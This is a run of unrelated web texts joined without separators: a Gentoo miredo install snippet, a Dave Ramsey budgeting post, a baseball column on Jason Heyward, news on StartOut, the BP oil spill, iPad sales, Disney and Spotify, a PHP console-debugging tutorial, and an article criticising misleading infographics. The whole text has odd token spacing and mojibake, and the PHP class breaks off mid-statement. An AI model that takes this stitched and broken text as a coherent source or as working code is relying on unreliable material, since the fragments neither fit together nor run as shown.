Windows Vista and later have Teredo support built - in .
To enable Teredo on Gentoo , simply sync portage and emerge and start miredo :
$ sudo eix-sync
$ sudo emerge - av net - misc / miredo
$ sudo /etc / init.d/ miredo start
To start miredo at boot , do
$ sudo rc-update add miredo default

Dave Ramsey ’s Baby Steps : Step 1 – $ 1000 Emergency Fund
Baby Step 1 : Save $ 1000 as a Starter Emergency Fund
I am a big fan of Dave Ramsey and his advice on money and life .
He has changed the way I think about my finances and it has been all for the better .
This is going to be the start of a 7 part series coveringto financial freedom .
Step 1 : $ 1000 Emergency Fund
This is the easiest and the hardest baby step .
It is the easiest because it is usually the smallest amount of money .
It is the hardest because it means you have to change old habits .
This baby step is all about changing old habits .
You ca n’t use credit cards any more .
You ca n’t finance anything .
You have to change your behavior .
The $ 1000 dollars is for emergencies and emergencies only .
It ca n’t be used when the pizza guy comes to the door .
When you need new tires you get to use the emergency fund .
“ But I want to just start getting out of debt ”
You can ’t .
It wo n’t work .
The problem is emergencies happen .
Cars break down , and the furnace will go out .
You have to stop using credit cards and change your behavior , so you have to have a cushion .
If you do n’t have this safety net when something happens you ’ll get discouraged and fall back to your old way of doing things .
You ’ll put it on the Mastercard or Visa and then give up in failure .
You ca n’t let this happen .
A few months ago we noticed the tires were starting to go bad on our car .
We knew they were n’t going to last forever , but we let them go a little longer .
Then winter came and the weather started getting worse .
We got quite a bit more snow and ice this year in Nashville than we usually do , so we had to get new tires .
We shopped around and ended up spending a little bit less than $ 300 .
When we had it done they let us know it was also time for new brakes .
I fixed those myself to save about $ 200 dollars , but it was still another $ 40 or so .
The good news ?
We had our emergency fund from baby step one in place .
Instead of being a crisis , it was merely an inconvenience .
The car is fixed and then we started to replenish the emergency fund .
We got it back and then resumed paying down our debt .
This is what it takes to succeed at getting out of debt and finding financial freedom .
On to baby step 2 : Get out of Debt .
Opening Day is not only the beginning of a season ; it is a rebirth of sorts .
We are ready to find hope in what could be hopeless , or show confidence that last year 's last - place finish was a fluke , yet most important of all is that we are about to embark on the journey in the life of a player .
This day could be the start of a special beginning as Ben Sheets locks in on being the comeback player of the year .
On Sunday night , the New York Yankees took the first step toward trying to recapture what it means to be a dynasty .
We do n't know what will happen , but we know there is no turning back .
Jason Heyward will bat seventh and start in right field for the Braves on Opening Day .

Jason Heyward is one of those stories .
When I was 20 years old , I had just finished my sophomore year of college , and that summer I put my name on the professional baseball map .
Fresh off winning a Best Pro Prospect award from Cape Cod , my star power rating was rising and I was touted as a potential first - round draft pick .
In the Cape League , I had played against the best I had ever competed against .
Gone was the comfort of aluminum bats .
In walked top prospects from the Pac - 10 , and here I was hauling Ivy League lumber around , not sure how I would stack up against college legends like Mike Kelly from Arizona State or Mark Smith from USC .
My concerns as a 20 - year - old were capitalizing on a strong Cape performance for the 1991 draft , figuring out how to get legal advice without actually having an agent , surviving a tough engineering class list and navigating a tough ex-girlfriend who did n't like the " ex . "
On the field , I kept the momentum going and landed in the first round of the June draft .
I was still 20 years old trying to figure out how to graduate while playing during the spring semester .
Once I signed my first professional contract in late July , I then learned about negotiation at its finest : telling the world that you , as a draft selection , were a brilliant pick , and then when the door was closed telling the draft pick all the things he could n't do .
Whoa .
Signing was a relief , since along the way I was struggling to understand that the baseball world suddenly had an opinion about me .
The idea that people who had never met me could wax eloquent about my throwing strength or the strength of my " heart " without even meeting me was shocking .
Who are all these people ?
Where did they come from ?
And this happened during the pre-Internet age .
Once the games began , I knew what to do , at least on the field .
I still had to learn that as a first - round draft pick , I would be constantly under the microscope .
Teammates watched , convinced I was n't that good .
People borrowed money from me like I was some sort of savings and loan , and I was naive enough to keep my teller 's window open even after a near - 100 percent default rate .
But I was the bonus baby .
I even had to figure out this dress - code thing .
Wearing T - shirts and my favorite lightweight bright blue pants was n't cutting it , and Jimmy Piersall was not exactly excited to see me when I arrived at my first early work session on time , telling me " five minutes early is on time ! "
The competition was fierce , and I fared well until I messed up my shoulder with what I retrospectively diagnose as thoracic outlet syndrome .
So before my 21st birthday , I was drafted , got a big bonus , lived on Main Street in Geneva , N.Y. , and got hurt .
There were a lot of players in that first league -- the New York - Penn League -- and the vast majority barely got to Double - A , let alone the big leagues .
So imagine what Heyward is looking at right now .
Although I had a nine - year major league career with pretty decent numbers , by the time I was in high - A ball at 21 , I was scrapping and clawing to hit .260 .
In the Carolina League , Alan Embree was throwing nearly 100 mph from the left side .
Greg McCarthy was sporting an 0.00 ERA for the entire season ( look it up ! ) .
Manny Ramirez was hitting balls to the opposite field that I did n't even understand , let alone catch .
How good are these guys ?
And this was only in Class A ball .
By the time I made my first major league camp , I was overmatched at the plate .
Granted , I was not drafted as a home run hitter , but I was supposed to hit a little bit .
Hitting against Chris Bosio , he diced me up like ham in his omelet , yet the Cubs generously kept me up in big league camp until nearly the end of spring training even as I hit under .200 .
I was 23 years old .
I wish Heyward the best of luck , because I know what he does n't know as a 20 - year - old .
Being on the field may be the easiest part of what he is facing , and that is coming from someone who at 20 was just getting started , light - years away from a major league stadium and Roy Halladay .
But Roy was not always Doc ; even I can attest to facing him in spring training in his younger days and seeing a four - seam fastball with no movement that was up in the zone .
Very hittable but not anymore .
Yet Heyward has shown he can handle the Doc of today or he would n't be in this position .
But off the field , he faces a tougher task .
Fitting in , listening to others but trusting himself , adjusting to the big league game , interviewing , dating , crisscrossing the United States with a sore hamstring and jet lag .
Get ready for the electricity of Opening Day , fireworks , Blue Angels , walk - offs and maybe even a brawl .
But keep in mind : Butterflies are filling in all these players ' stomachs .
And if you happen to be the rare person to be 20 years old and in a major league lineup , take a big breath and jump in at the deep end of the pool , because there is no shallow end .
Doug Glanville , who earned a degree in systems engineering from the University of Pennsylvania , played nine major league seasons with the Cubs , Phillies and Rangers .
This is his first column for ESPN.com .
Lots of entrepreneurs would like to pick Chip Conley ’s brain .
But when several dozen gathered in November to meet the founder of Joie de Vivre , a boutique hotel chain that he said had $ 220 million in revenue last year , their questions were not just about the nuts and bolts of running a company .
They also asked :
How do you come out of the closet in your business ?
And how do you handle investors who might be uncomfortable with your vocal support of gay rights ?
Conley , 49 , who came out four years before he opened his first hotel , the Phoenix , in 1987 , recounted steering such investors to the website of Kimpton Hotels , a competitor that promotes its support for gay employees .
Then he told them that one of Kimpton ’s biggest investors was a former Senate Republican leader , Bill Frist .
That example , Conley recalled , was enough to ease the investors ’ concerns .
Conley ’s talk was organized by StartOut , a new nonprofit networking group for gay entrepreneurs .
The group , organized by a circle of friends in spring 2009 , has since drawn some 1,000 participants to events in San Francisco , New York and Los Angeles .
Entrepreneurs come to StartOut events to network , share ideas and sip cocktails .
They come to talk business in a setting free of awkward assumptions .
( “ What does your husband think ? ” )
And they come to hear speakers like Conley , who serves on the group ’s advisory board , or Mitchell Gold , co-founder of the furniture company Mitchell Gold & Bob Williams , or Megan Smith , vice president for new business development at Google , who is headlining a StartOut event later this month .
Darren Spedale , an investment banker - turned - serial entrepreneur in Manhattan , came up with the idea for StartOut a year ago .
Spedale , most recently a founder of A - List Global Media , a company that creates media and entertainment products for adolescents , noted that plenty of other groups had entrepreneurship associations — like Astia for women or TiE for South Asians .
“ Why on earth is n’t there anything like this for the gay and lesbian community ? ” he remembers thinking .
“ It was a no - brainer . ”
In fact , the past decade has seen a flowering of affinity groups for gays in business .
MBA candidates can get connected through Out for Business clubs at their universities and the annual Reaching Out conference , which brought more than 900 attendees to Atlanta in October .
There are about 1.2 million gay - owned businesses in the United States and about 29,000 of them belong to local gay chambers of commerce , according to Justin G. Nelson , president and a founder of the National Gay and Lesbian Chamber of Commerce , which was organized in 2002 in Washington .
For too many years , Nelson said , the prevailing attitude among gay entrepreneurs in America was , “ It ’s OK for me to be gay , but I ca n’t do it in my business for fear that it will ruin my company . ”
That message , however , has evolved .
“ It ’s a sign of the enlightened times that we live in , ” said Patrick Chung , a StartOut advisory board member , of the proliferation of gay business groups .
Chung works in Menlo Park as a partner at New Enterprise Associates , a global venture capital firm .
( He knows of only one other openly gay venture capitalist in Silicon Valley : Amy Errett of Maveron , who is also on the advisory board of StartOut . )
“ The generation that ’s coming through now , they ’re more comfortable in their skin , ” Chung added .
“ There ’s been more societal support . ”
StartOut has only one employee , an administrative assistant , who draws a salary .
Spedale , the founder , sits on the organization ’s board , but it is n’t his full - time job .
The group does n’t have an official membership roster .
There are no dues , although some events require paid admission .
Its e-mail list and its Facebook page have more than 1,000 subscribers .
This month , StartOut volunteers plan to teach teenagers about entrepreneurship at the Hetrick - Martin Institute , a New York City nonprofit organization that serves gay youths .
Spedale and a few colleagues will play the part of investors , critiquing the teenagers as they come up with and present business ideas , discussing how to get clients , sell products and complete other entrepreneurial tasks .
StartOut connections are already paying dividends for Brian Backus .
When Backus attended the group ’s San Francisco kickoff event in August , he was raising seed capital for a new startup , Kidlandia , that makes personalized maps for children .
In a crowd of some 300 gay entrepreneurs , he met Lorenzo Thione , a member of StartOut ’s board who had sold his online search startup , Powerset , to Microsoft in 2008 and was looking for new investment opportunities .
They kept in touch .
By the time Backus closed his first round of financing in October , Thione had jumped on board with a five - figure investment .
Since then , Kidlandia has continued to grow , forging distribution deals with Pottery Barn and several multinational toy retailers .
“ It ’s fantastic , ” Backus said of StartOut .
“ You end up creating an ecosystem where people can help fund each other . ”
Or maybe just find each other .
In March , Emily Drabant , 28 , who is completing her doctorate in neuroscience at Stanford University , listened to a StartOut talk featuring lesbian entrepreneurs .
At the end , she struck up a conversation with a panelist , Carol Nast , 60 , president of Enterprise Catalyst Group , a medical technology consulting firm .
Nast volunteered to serve as a mentor to Drabant through the transition from academia to industry .
“ I just walked out of that meeting feeling so energized , ” Drabant said .
“ I feel like she saw things in me that I did n’t see in myself . ”
Brian Elliot , the founder of the Right Side of History , a nonprofit social media platform created to promote gay rights that is to begin operating this summer , credits StartOut with helping him find Jeff Green , his third full - time employee .
Green was introduced to Elliot by Gabe Zichermann , who runs the mentorship arm of StartOut .
A former vice president with Morgan Stanley Smith Barney , Green was interviewing at Google when Elliot made him an offer .
“ We ended up hiring him , ” Elliot said .
“ He ’s full time now , double time , actually .
We ’re working very hard .
I ’m really grateful for having been involved with StartOut . ”
Zichermann , who is chief executive of a mobile software startup , BeamME , hopes that support will continue to grow — because if being gay has its challenges , so does being an entrepreneur .
“ Being an entrepreneur is a very stupid thing to do , ” he said .
“ The odds are stacked against you .
One of the critical things that founders need is the fellowship of other entrepreneurs . ”
So far , he said , Start - Out events have felt less cutthroat — more collaborative and collegial — than other startup events he had attended .
HOUSTON / MIAMI ( Reuters ) - BP BP.L is continuing with its " top kill " operation to try to plug its leaking Gulf of Mexico oil well but has no immediate update to give on whether it has succeeded , a BP spokesman said on Thursday .
Spokesman David Nicholas was responding to a Los Angeles Times report that had quoted a U.S. Coast Guard admiral leading the oil spill response as saying the top kill procedure had succeeded in blocking the leak .
“ The top kill operation continues , there are no operational updates , ” Nicholas told Reuters .
He could not say when the next progress report would be given but recalled that BP executives had said it could take up to two days to tell whether the top kill operation , which started on Wednesday , had worked .
The oil spill response unified command , which includes both BP and the Coast Guard , said it could not confirm or deny the Latimes.com report , which cited Coast Guard Admiral Thad Allen .
BP shares were up more than 5 percent in London trading .
Allen told National Public Radio that BP engineers had “ been able to force mud down and not allow any hydrocarbons to come up . ”
But he added this did not mean the well was sealed or that the problem was solved .
The top kill attempt , which has been underway for more than 20 hours , involves pumping heavy drilling fluids into the top of the well to try to halt the oil flow .
If it succeeds in doing this , cement would then be injected to cap the well .
BP Managing Director Robert Dudley said earlier on Thursday the procedure was “ moving the way we want it to . ”
But he told NBC ’s “ Today Show ” it was too early to say whether it had been successful .

Apple is supposedly selling an astounding 200,000 iPads per week in the US , a number that is leaving current weekly Mac sales in the dust .
This bold claim was made by analyst Mike Abramsky of RBC Capital Markets in a note sent to investors Thursday ( seen by Apple Insider ) .
The estimate puts the iPad in front of Apple ’s Mac line , estimated to be selling 110,000 units per week in the US , but behind the iPhone 3GS which , during the first quarter of 2010 , was selling about 246,000 units per week .
Abramsky also claims that over 25 percent of all brick - and - mortar Apple Stores in the US are currently “ allocating to waiting lists " for the iPad .
What little stock stores do have seems to be WiFi - only units .
It is currently unclear whether the iPad shortage is due to extreme demand or if Apple is stockpiling units for its May 28 international launch .
The same analyst believes that Apple currently has already presold 600,000 units in countries that will see a summer iPad launch .
Abramsky believes that the iPad will cannibalize 25 percent of Apple 's other products , although it is unclear whether that cannibalization will be from just Macs , or iPhone and iPods as well .
Regardless , he claims that Apple will see increased revenue because of the new device .
Like Steve said , it 's better for Apple to cannibalize itself than let someone else do the job first .
News of cannibalization could be premature however , at least according to findings presented by the online advertising firm Chitka .
The company saw an almost 3 percentage point rise in Mac OS Web traffic last month .
There could be a number of different explanations for this increase , but Chitka indicates that it may be due to the " iPad effect . "
That is , users being inspired by their iPads to go out and buy a Mac .
Although it 's too early to tell whether that 's the case , one thing we can be certain of is that the iPad is popular .
Debugging PHP is often done in many ways .
By printing some info on the screen , using die or var_dump , using log files in which you can always write errors , warnings and similar .
The bad thing is , it will destroy your layout , and it will be barely readable .
But why not using only one tool for all scripts ( PHP and Javascript ) .
As FireFox and Chrome have Javascript consoles , we can easily use them to debug PHP , too .
This way you can have nice colored output , with line numbers and everything you need .
The best thing is you can print arrays or even the whole object to console .
You will say that it will destroy browsers that do not use / have console , like IE .
But I have taken care of that , too .
First , I will show you the class that is responsible for the whole thing :
class PHPDebug { function __construct ( ) { if ( ! defined ( " LOG " ) ) define ( " LOG " , 1 ) ; if ( ! defined ( " INFO " ) ) define ( " INFO " , 2 ) ; if ( ! defined ( " WARN " ) ) define ( " WARN " ,3 ) ; if ( ! defined ( " ERROR " ) ) define ( " ERROR " ,4 ) ; define ( " NL " , " \r
" ) ; echo '< script type = " text / javascript " >'. NL ; /// this is for IE and other browsers w/o console echo ' if ( !window.console ) console = {} ; ' ; echo ' console.log = console.log || function ( ) {} ; ' ; echo ' console.warn = console.warn || function ( ) {} ; ' ; echo ' console.error = console.error || function ( ) {} ; ' ; echo ' console.info = console.info || function ( ) {} ; ' ; echo ' console.debug = console.debug || function ( ) {} ; ' ; echo '</ script > ' ; /// end of IE } function debug ( $ name , $var = null , $ type = LOG ) { echo '< script type = " text / javascript " >'. NL ; switch ( $ type ) { case LOG : echo ' console.log ( " '. $ name . ' " ) ;'.NL ; break ; case INFO : echo ' console.info( " '.$ name . ' " ) ;'.NL ; break ; case WARN : echo ' console.warn ( " '.$ name . ' " ) ;'.NL ; break ; case ERROR : echo ' console.error ( " '.$ name . ' " ) ; '. NL ; break ; } if ( ! empty ( $var ) ) { if ( is_object ( $ var ) || is_array ( $var ) ) { $ object = json_encode ( $var ) ; echo ' var object'.preg_replace ( ' ~ [ ^A - Z|0 - 9 ] ~i' , " _ " , $name ) .

I will not go into details about the code , as it should be understandable to medium experienced PHP programmer .
Basically , this class is generating JavaScript to insert messages or variables to console .
Simple as that .
The part that is dealing with IE is creating empty functions for every console function we are using , and thus IE is working despite of writing to console .
Cool .
Now , how to use this class , below is code that is used on the DEMO page :
// include and instantiate the class require_once ( " PHPDebug.php " ) ; $ debug = new PHPDebug ( ) ; // simple message to console $ debug -> debug ( " A very simple message " ) ; // vaiable to console $ x = 3 ; $y = 5 ; $ z = $ x / $y ; $ debug -> debug ( " Variable Z : " , $ z ) ; // a warnign $ debug -> debug ( " A simple Warning " , null , WARN ) ; // info $ debug -> debug ( " A simple Info message " , null , INFO ) ; //
An error $ debug -> debug ( " A simple error messsage " , null , ERROR ) ; //
Array in console $ fruits = array ( " banana " , " apple " , " strawberry " , " pineaple " ) ; $ fruits = array_reverse ( $ fruits ) ; $ debug - > debug ( " Fruits array " , $ fruits ) ; // object to console $ book = new stdClass ; $ book -> title = " Harry Potter and the Prisoner of Azkaban " ; $ book -> author = " J. K. Rowling " ; $ book -> publisher = " Arthur A. Levine Books " ; $ book -> amazon_link = " http://www.amazon.com/dp/0439136369/ " ; $ debug -> debug ( " Object " , $ book ) ;
To see above code in action , open your console ( in FireFox or Google Chrome ) and go to the DEMO PAGE .
You can do the same with Internet Explorer , and the div containing message will appear , and IE will not break .
Above code is free and you can use it however you see fit .
A while back , Disney scrapped Terminator Salvation director McG 's darker version of Jules Verne 's 20,000 Leagues Under The Sea .
Now Disney 's talking with a new director , David Fincher of Fight Club and Se7en .
His oeuvre ai n't sunshine and rainbows .

According to THR , Fincher got the gig this winter by approaching Disney about directing " a four - quadrant tentpole movie . "
Also , Bourne Ultimatum writer Scott Z. Burns will pen the script .
Verne 's 1869 novel is in public domain , but Disney is turning to the book once again as part of an initiative to resurrect established properties ( see : Tron Legacy , Race To Witch Mountain ) .
It appears that Disney is capitalizing on the nostalgia of their 1954 version starring Kirk Douglas .

The last time we saw Captain Nemo in a big - ticket blockbuster was 2003's League of Extraordinary Gentlemen , in which he practiced some fancy kung - fu .
I doubt that Nemo 's close combat expertise will make Fincher 's cut , but hey , at least we wo n't have Drew Barrymore tearing through the Nautilus on a dirt bike .
UPDATE 5/16/10 : Also , how will Disney 's adaptation fare given that Fox is making their own version of 20,000 Leagues with Ridley and Tony Scott producing , Clash of The Titans writer Travis Beacham on scripts , and Wanted 's Timur Bekmambetov in talks to direct ?
Oh , public domain !
In addition to the social elements of the upgrade , Spotify is also adding the ability to synchronise a user ’s personal music collection with the service .
As well as playing all their music from within Spotify , a user will be able to use Spotify to plug gaps in their collection - for example , streaming a whole album even if they own just one song from it .

A certain category of design gaffes can be boiled down to violations of audience expectations .
Websites that do n’t work in Internet Explorer are a heck of a nasty surprise for users who , bless their souls , want the same Internet experience as everyone else .
Websites that prevent copying , whether through careless text - as - image conversions or those wretched copyright pop-ups from the turn of the century , cripple a feature that works nearly everywhere else on the Internet .
Avoiding this category of blunders is crucial to good design , which is why I am upset that one particular pitfall has been overlooked with extreme frequency .
According to statlit.org , statistical literacy is the ability to read and interpret summary statistics in the everyday media : in graphs , tables , statements , surveys and studies .
Statistical literacy is needed by data consumers .
You may also want to check out the following Smashing Magazine articles :
The importance of statistical literacy in the Internet age is clear , but the concept is not exclusive to designers .
I ’d like to focus on it because designers must consider it in a way that most people do not have to : statistical literacy is more than learning the laws of statistics ; it is about representations that the human mind can understand and remember ( source : Psychological Science in the Public Interest ) .
Can you notice what ’s wrong with this infographics ?
You will find a detailed answer below , in the showcase of bad infographics .
As a designer , you get to choose those representations .
Most of the time this is a positive aspect .
Visual representations allow you to quickly summarize a data set or make connections that might be difficult to perceive otherwise .
Unfortunately , designers too often forget that data exists for more than entertainment or aesthetics .
If you design a visualization before correctly understanding the data on which it is based , you face the very real risk of summarizing incorrectly , producing faulty insights , or otherwise mangling the process of disseminating knowledge .
If you do this to your audience , then you have violated an expectation of singular importance for any content creator : their expectation that you actually know what you ’re talking about .
Anyone would be hard - pressed to find fault with the desire to make life prettier , but every color - coded geometric shape that you add to your awesome new “ Lady Gaga vs. EyjafjallajÃ¶kull ” infographic brings us all one step closer to something going horribly wrong .
Most designers would probably not edit a politician ’s party affiliation in a news article to make the text wrap in a way that is more pleasing to the eye .
With data , though , careless designers all too readily sacrifice truth for the sake of aesthetics .
Lovecraft ’s eldritch horrors will rise only when the stars are right , but the preconditions for bad visual representations are already in place :
Demand for graphs , charts , maps and infographics has increased .
Increased data availability and more powerful tools have made it easier than ever to create them .
But you probably do n’t have a solid understanding of how to interpret or process data .
Nor likely do your readers .
And there ’s a good chance that neither of you know that .
Do you hear that fateful , fearsome ticking ?
You ’ve given your audience a time bomb of misinformation , just waiting to blow up in their faces .
Perhaps they will forget your inadvertent falsehood before they harm someone with it , but perhaps they will be Patient Zero in an outbreak of viral inaccuracy .
Curing that disease can be excruciatingly difficult , and even impossible : one of the more depressing findings in psychology is that trying to set the record straight can muddle it further .
The lesson is clear : provide the right story the first time .
But the staggering variety of awful visualizations online makes it equally clear that designers have n’t learned that lesson yet .
Let ’s see just how bad it can get .
Showcase Of Bad Infographics

Yikes !
Note how enormously misleading the red and blue bars are .
There is absolutely no reason for their presence in this graph .
Even if they were actually scaled to the number of total new jobs , a two - axis graph would still be difficult for most people to understand .
The figure also does n’t take into account a host of potentially confounding factors , including ( but not limited to ) population growth , women entering the workforce , shifts from part - time to full - time jobs , change in wages and GDP change .

This graph circulated fairly widely for a while .
The design of the food pyramid changed recently , in part because the visual characteristics of the old pyramid did not correspond well to the numerical recommendations .
The new designer makes the same mistake but disdains “ misleading ” in favor of “ mind - bogglingly dishonest . ”
The bottom tier of the left - hand pyramid takes up far more than 73.80 % of the pyramid ’s area , and the 3 - D diagram enhances that distortion even further .

Hide the numbers and ask your friends to guess what they are !

This classic suffers from the same problem as the food pyramid : the odd mushroom shape makes seeing the correct relationship impossible at a glance .
The disparity between Bravo and Tzar Bomba is like a bad jokeâ€¦ and the punchline ?
In real life , doubling the destructive power of a nuclear blast does n’t even come close to doubling the height of the resulting mushroom cloud .

The flashy background and bright colors must have distracted this graph ’s creator from the fact that it ’s useless .
Think the graph is describing crime rates ?
Think again .
It actually describes the percentage change in violent crime rates .
New York at 20 % of its 1990 crime rate could still be more violent than Philadelphia at over 100 % of its 1990 crime rate .
If you want to know how dangerous these cities really are , you ’ll have to look elsewhere .

There have been worse pie charts , but this one is bad in a subtle way .
The point of a pie chart is presumably to facilitate a comparison of land use , but this pie chart makes that very difficult .
Given the combination of the huge number of categories and the huge change in their values , this would have been better rendered as a table .

This graph is a painful experience all around .
Income is described as “ percentile ” but is shown in ranges .
The category labels are placed randomly around the data points , rather than at the bottom where they belong .
The data points are tremendous circular blobs that are impossible to compare at a glance .
And that ’s with only five data points !

This is a line graph of binge drinking and suicide rates .
Wait , scratch that : it ’s an abomination , Alphabetically ordered lists of states belong in tables — maybe — and that ’s only if you would n’t prefer to index them by some variable or another .
Two - axis charts are as bad as any idea , especially when it ’s not clear what the two variables actually are .
But the worst part ?
It is n’t population adjusted .
The states with the most deaths are the states with the most residents : California , Texas , New York and Florida .
Knowing that someone made this and thought enough of it to post it on the Internet makes me want to drink .

A certain measure of artistic expression is a great thing .
This , on the other hand , is not .
The bars have no proportion , even though there is no aesthetic reason why they could n’t .
What could have been a perfectly appealing mix of presentation and information has left any semblance of usefulness to die of neglect .
Why not make the flag ’s background represent Haiti ’s casualties and then scale the war casualties to match ?
The world may never know .

Trick question : what ’s wrong with this map ?
Answer : there is n’t a map .
The image may contain something that resembles a map , but it ’s actually a map - shaped hole in effective data presentation .
While the data in the table is presented more effectively , it ’s too sparse to be of much use : how do those raw figures compare to tax rates , GDP , individual wealth or the many other factors that prevent easy comparison of states ?
Large view
This is n’t so poor a choice of representation at first glance .
But several subtle flaws could mislead the casual observer .
To the lower right , we see three blocks labeled “ 7 % ” that have wildly different heights , presumably because of rounding in display .
Dropping the decimal points is sometimes acceptable , but you ca n’t have it both ways : either those digits matter and should be shown , or they do n’t matter and should n’t appear anywhere in the graph ( in either the labels or bars ) .
The other major design failure here is the key , which misleadingly states that the darkest color is for someone in the “ top fifth . ”
But which top fifth ?
We can see that you have to have a graduate degree and end up in the top fifth in income to be the darkest shade , but that would put someone in the 94th percentile ( that is , the top twentieth ) .
This is a case of an intuitive concept ( darker means either wealthier or more educated ) executed in a sub-standard way .
I leave it to the audience to decide whether it ’s a mite useless , or even misleading , to only consider Americans with full - time employment .
Large view
The first thought anyone should have when they see this is that it ’s way too cluttered .
The concern for the flags is merely aesthetic ( as if anyone knows more than a handful of state flags ) , but the concern for the labels is about truthfulness .
We ’re presumably meant to look at the top of the flagpoles , but we ca n’t do that because there ’s no axis for comparison , so we look to the labels for information .
This means that we ’re not going away with any more information than we might have from a table , but we might come away with less if we accidentally judge using the curve of the labels that we ’re reading instead of the curve of the flagpole tops .
Compare California to Washington to see what a difference that would make !
Thankfully , most people wo n’t skim long enough to notice the worst offender , which lurks at the bottom of the page .
I knew something was about to go terribly wrong when I spied the notice stating that the graph “ starts ” at $ 20,000 .
Is the bottom of the page $ 20,000 ?
Or is it the red line ?
Why is this counter - intuitive perspective even being used ?
I fear I may be kept waiting a long time for answers .

Maps are a common way to represent information , but they ’re also a common way to misrepresent information .
This map is a wonderful example of that very un-wonderful fact .
You can see a large version of it at its source , but I ca n’t recommend it for the faint of heart : the original is grossly oversized , its aesthetics are just plain gross , and it ’s served as a PDF with even more awful JPG artifacts .
This map purports to show the number of murdered transgendered people over a one - year period .
But there ’s a big problem : there is no data for the vast majority of the world ( either by country or by population ! ) .
The data that is there is likely quite suspect , too ( only one transgendered person was murdered in a country the size of Russia ? ) .
Tracking hate crimes is notoriously difficult for a variety of reasons , most of which apply especially to the transgendered community ; but even compelling reasons for a lack of accurate data do n’t actually make up for that lack .
This map ’s worst failing , though , is that its does n’t show hate crimes at all .
I obviously do n’t condone murder , but within a large enough group , murders are a fact of life .
Half a million people are murdered around the world each year , and if even one in ten - thousand people is transgendered , we should expect to see hundreds of transgendered murder victims , for the same reason that we should expect to see tens of thousands of left - handed murder victims or hundreds of thousands of female murder victims .
Hate crimes against transgendered people are real ; they can also deadly , which makes accurate information that much more critical .
Perhaps presenting the information in this very sparse table in the context of a larger report would have been acceptable , but to use a poorly designed map with no disclaimers as a summary of findings is dishonest beyond belief .

Get Virtuous Designers
If you ’ve survived the array of horrors described above , take heart .
Many design flaws can be remedied by learning patterns , principles or lenses that make avoiding disfunction easier .
Even someone with no design background can read an article about why Comic Sans is never the right choice and resolve never to use it again .
The curriculum is different , of course , but this is as true for data as it is for design .
Unfortunately , curing statistical illiteracy is n’t as easy as reading an article about it or even taking a statistics course .
While a solid understanding of statistics is beneficial for a wide variety of purposes , countering statistical illiteracy requires the cultivation of an active interpretative technique that is separate from knowledge of pure mathematics .
Statistical literacy is only the bare minimum , though .
The burden on designers is heavier because their uses of data often require them to go beyond interpretation and to perform some basic analysis , summarization or transformation of data .
However , a formal education in research methods is probably too extreme .
I believe that most mistakes of data could have been avoided had the designers focused on a limited skill set that is to a media producer what statistical literacy is to a media consumer .
For now , let ’s call this data mindfulness .
Mindfulness means exhibiting care , caution , exactness , prudence , regard and many other virtues .
Data mindfulness is similar to someone imploring another to “ be mindful ” of something potentially dangerous .
As a designer , you can be careful about the sources of data you choose and can be cautious of the claims you make based on that data .
Your exactness is reflected in the effort you put into correctly transforming the original data .
Your prudence relates to whether you are honest in your intent and methods .
But regard comes closest to the concept of data mindfulness : to be mindful of your data — to avoid mistakes with it and prevent the harm that would result from such mistakes — you should regard it with respect .
Know Your Data : Mind , Body , And Soul
The mind - body - soul connection provides a convenient , memorable context in which to learn about data .
With the mind already dealt with , where do the other two members of the trifecta fit in ?
Our data ’s “ body ” is its form and function .
Like the human body , it consists of both overarching similarities and individual differences .
Here we can draw an analogy with dislocation : just because your arm twists a certain way does not mean that it is supposed to ; on the other hand , some people are indeed flexible enough to move in just that way .
When we exceed the limitations of our body , we hear the body ’s complaints loudly .
But your data wo n’t let you know when you twist it out of shape ( though you may hear some poor statistics professor screaming on its behalf ) .
When we consider our data ’s “ body , ” we ’re considering the performance it can achieve and the stresses it can tolerate .
That process often begins with these simple questions :
How was it collected ?
What are its limitations ?
Which mathematical transformations are appropriate ?
Which methods of display are appropriate ?
Our data ’s “ soul ” is its context and broader meaning .
One popular understanding of a soul is that it is some part of an individual that glorifies their uniqueness even while making them a part of a profound commonality .
In a mystical context ( whether you believe in it or not ) , we can easily understand this apparent contradiction .
In a mundane context , many people would find the dissonance hard to swallow .
This is unfortunate , because data must be understood in just this way : it is both an individual entity and a unit of a larger whole .
Reconciling these is a notoriously tricky task , but some of the worst mistakes are avoided by collecting a few crucial bits of information :
Who collected it ?
Why was it collected ?
What is its context in a broader subject ?
What is its context in the field of research that created it ?
These eight questions should take under five minutes to run through , but they would prevent the vast majority of mistakes that designers make .
Let ’s assume for a moment , then , that you ’re a responsible designer , and you try your best to come up with answers to these questions for the data you want to use .
What if you can’t ?
If your data ’s “ body ” fails to stand up to scrutiny , then this is not necessarily a problem , depending on how serious is the task that you intend to put it to .
Restricting yourself to a scientific level of evidence will earn you an A + for effort , but it is not necessary for most design purposes .
You will be limited in the claims you can make , but you can usually still make use of the data in some form without sacrificing honesty .
Even scientists love preliminary data ( or “ napkin math , ” ) as long as they know that that ’s what they ’re looking at !
If your data ’s “ soul ” is tainted , though , it could go to hellâ€¦ in a figurative sense , of course : it would be banished somewhere where people would n’t draw the wrong conclusions from it .
Getting some use out of potentially biased data is not impossible , but it ’s not easy , and there are often other sources to draw upon anyway .
If you smell smoke or , heaven forbid , a whiff of brimstone , do n’t assume it ’s because your infographic is so hot .
Even people who do this for a day job get burned by misleading or downright falsified data more often than you might expect .
For most any controversial issue , figuring out whose numbers to trust is difficult .
Learn It , Live It. You Can Love It Later .
I suspect that some designers are beyond their comfort zone by this point , so I ’ll use a more familiar topic as an example of how to fit data mindfulness into your design .
Many of you probably have experience with color theory or typography or have even taken courses on them .
Or perhaps neither is your thing but you can still explain to someone why an image printed out looks different than on a monitor , or why Papyrus is a poor font choice .
More importantly , you likely know where to find detailed information on particular topics in those fields when you need it .
Simply studying and practicing these fields to become proficient in them is possible , but few people can afford to master every skill they use in design .
And yet most of us could afford a little more time to round out our skill sets .
Just as with color theory and typography , even a novice understanding of the concepts involved in analyzing and representing data tunes a designer into the fact that it truly is a separate skill .
This awareness allows you to stop yourself and say , “ I do n’t know how to do this yet . ”
Consciously recognizing that there is a “ this ” at all is an absolute prerequisite to being mindful .
Conclusion
Perhaps this all sounds a little extreme to you .
But remember the stakes : while a poor font choice can ruin a meeting , a poor interpretation of statistics or data can kill you ( or someone else , for that matter ) .
Proper use of data is a viciously complicated topic , and I am no expert .
But I feel confident enough to make this claim : if it would lead to the wrong conclusions , not presenting the data at all would be better .
Here is a simple rule for designers : your project is n’t ready to be released into the wild if you ’ve spent more time choosing a font than choosing your data .
Amazing !
